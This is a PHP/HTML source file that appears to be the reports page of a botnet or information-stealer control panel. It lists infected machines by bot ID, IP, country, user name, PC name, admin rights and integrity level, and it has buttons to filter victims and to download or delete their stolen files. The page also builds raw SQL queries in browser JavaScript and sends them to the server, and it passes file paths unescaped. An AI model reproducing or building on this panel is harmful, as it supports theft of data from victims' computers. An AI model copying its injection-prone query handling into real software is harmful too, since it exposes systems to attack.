<?php
    include('global.php');
    session_start();
    if (!isset($_SESSION['username']))
    {
        header("Location: login.php");
        die();
    }
    $db = new SQLite3('info/info.db');
?>

<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.0/css/all.css">
		<link rel="shortcut icon" type="image/png" href="img/favicon.png">

	</head>

	<body>
         <script>
             function _callback(data) {
                 var main_tbody = document.getElementById('main_items');
                 while (main_tbody.firstChild) main_tbody.removeChild(main_tbody.firstChild);

                 main_tbody.insertAdjacentHTML('beforeend', data);
             }

             function getQuery() {
                 var _os = document.getElementById('os_select');
                 var os_text = '';
                 if (_os.selectedIndex) {
                     if (_os.selectedIndex == 1) os_text = 'IN (1, 2)';
                     else if (_os.selectedIndex == 2) os_text = 'IN (3, 4)';
                     else if (_os.selectedIndex == 3) os_text = 'IN (5, 6)';
                     else if (_os.selectedIndex == 4) os_text = 'IN (7, 8)';
                     else if (_os.selectedIndex == 5) os_text = 'IN (9, 10)';
                     else if (_os.selectedIndex == 6) os_text = 'IN (11, 12)';
                 }

                 var _bitness = document.getElementById('bitness_select');
                 var bitness_text = _bitness.options[_bitness.selectedIndex].text;

                 var _admin = document.getElementById('admin_select');
                 var is_admin = _admin.options[_admin.selectedIndex].text;

                 var _il = document.getElementById('il_select');
                 var integrity_level = _il.options[_il.selectedIndex].text;

                 var _country = document.getElementById('country_select');
                 var country_text = _country.options[_country.selectedIndex].text;

                 var query = 'SELECT * from main';
                 if (os_text || bitness_text || is_admin || integrity_level || country_text) {
                     query += ' WHERE';
                     if (os_text) query += ' OS_VERSION ' + os_text + ' and';
                     if (bitness_text) query += ' X64=' + ((bitness_text == 'X64') ? '1' : '0') + ' and';
                     if (is_admin) query += ' IS_ADMIN=' + is_admin + ' and';
                     if (integrity_level) query += ' INTEGRITY_LEVEL="' + integrity_level + '" and';
                     if (country_text) query += ' country="' + country_text + '"';
                     var _splitRes = query.split(' ');
                     if (_splitRes[_splitRes.length - 1] == 'and') query = query.substr(0, query.length - 3);
                 }
                 return query;
             }

             function _filter() {
                 var query = getQuery();
                 $.post('filter.php', {query: query}, _callback);
             }

             function _downloadAll() {
                 var query = getQuery();
                 window.location.href = 'downloadAll.php?query=' + query;
             }

             function _deleteAll() {
                 var query = getQuery();
                 $.post('deleteAll.php', { query: query });
                 location.reload();
             }
        </script>

		<?php $type = "reports"; include("nav_bar.php"); ?>

		<div class="col-md-9">
			<div class="row">
				
				<!--
				<div class="select-block">
					<p class="content-subheading">Date From</p>
				
					<select class="content-dropdown">
						<option>First Option</option>
						<option>Second Option</option>
						<option>Third Option</option>
					</select>
				</div>

				<div class="select-block">
					<p class="content-subheading">Date Up</p>
				
					<select class="content-dropdown">
						<option>First Option</option>
						<option>Second Option</option>
						<option>Third Option</option>
					</select>
				</div>
				-->

				<div class="select-block">
					<p class="content-subheading">OS</p>
				
					<select id="os_select" class="content-dropdown">
                        <option></option>
						<option>XP (Server 2003 (R2) )</option>
						<option>VISTA (Server 2008)</option>
						<option>WIN7 (Server 2008 R2)</option>
                        <option>WIN8 (Server 2012)</option>
                        <option>WIN8.1 (Server 2012 R2)</option>
                        <option>WIN10 (Server 2016)</option>
					</select>
				</div>

				<div class="select-block">
					<p class="content-subheading">OS Bitness</p>
				
					<select id="bitness_select" class="content-dropdown">
						<option></option>
						<option>X86</option>
						<option>X64</option>
					</select>
				</div>

				<div class="select-block">
					<p class="content-subheading">Is Admin</p>
				
					<select id="admin_select" class="content-dropdown">
						<option></option>
						<option>1</option>
						<option>0</option>
					</select>
				</div>

				<div class="select-block">
					<p class="content-subheading">Integrity Level</p>
				
					<select id="il_select" class="content-dropdown">
						<option></option>
						<option>low</option>
						<option>medium</option>
                        <option>high</option>
                        <option>system</option>
					</select>
				</div>

				<div class="select-block">
					<p class="content-subheading">Countries Filter</p>
				
					<select id="country_select" class="content-dropdown">
                        <option></option>
                        <?php
                            $countries = array();
                            $result = $db->query('SELECT DISTINCT COUNT( country ) as amount, country FROM main GROUP BY country');
                            while ($row = $result->fetchArray())
                            {
                                $amount = $row['amount'];
                                $name = $row['country'];
                                $countries[$name] = $amount;
                            }
                            arsort($countries);
                            foreach($countries as $key => $value)
                            {
                                echo "<option>$key</option>";
                            }
                        ?>
					</select>
				</div>

                <center>
                    <button onclick="_filter()" type="submit" style="margin-top:30px;width:200px;height:25px">
                            Filter
                    </button>
                    <br />
                    <button onclick="_downloadAll()" type="submit" style="margin-top:30px;width:200px;height:25px">
                        Download All
                    </button>
                    <button onclick="_deleteAll()" type="submit" style="margin-top:30px;width:200px;height:25px">
                        Delete All
                    </button>
                </center>

				<table class="table">
					<thead>
						<tr>
							<th scope="col">GUID</th>
							<th scope="col">IP</th>
                            <th scope="col">Country</th>
							<th scope="col">OS</th>
                            <th scope="col">User</th>
                            <th scope="col">PC</th>
							<th scope="col">64-bit</th>
							<th scope="col">Is Admin</th>
							<th scope="col">IL</th>
                            <th scope="col">Log Date</th>
							<th scope="col"></th>
						</tr>
					</thead>

					<tbody id="main_items">
                        <?php
                            $results = $db->query('SELECT * from main');
                            while ($row = $results->fetchArray())
                            {
                                $bot_id = $row['BOT_ID'];
                                $date = gmdate("H:i:s d-m-Y", $row['timestamp']);
                                $file = glob("files/*$bot_id*")[0];
                                echo "<tr class=\"table-item\">";
                                echo "<td>$bot_id</td>";
                                echo "<td>{$row['BOT_IP']}</td>";
                                echo "<td>{$row['country']}</td>";
                                echo "<td>{$row['OS_NAME']}</td>";
                                echo "<td>{$row['USER_NAME']}</td>";
                                echo "<td>{$row['PC_NAME']}</td>";
                                echo "<td>{$row['X64']}</td>";
                                echo "<td>{$row['IS_ADMIN']}</td>";
                                echo "<td>{$row['INTEGRITY_LEVEL']}</td>";
                                echo "<td>$date</td>";
                                if ($file)
                                {
                                    echo "<td><a href=\"download.php?file=$file\" class=\"table-button\"><i class=\"fas fa-download\"></i></a> ";
                                    echo "<a href=\"delete.php?bot_id=$bot_id&file=$file\" class=\"table-button\"><i class=\"fas fa-trash-alt\"></i></a></td>";
                                }
                                echo '</tr>';
                            }
                            $db->close();
                        ?>
					</tbody>
				</table>
			</div>
		</div>

		<script type="text/javascript">
			$(document).ready(function() {
				var margin = ($("#stats-block").outerWidth() - ($("#counter-1").width() + $("#counter-2").width()) - 20) / 2;
				var height = $("html").outerHeight();
				$("#counters-block").css("padding-left", margin);
				$(".menu").css("height", height);
			});
		</script>
	</body>
</html>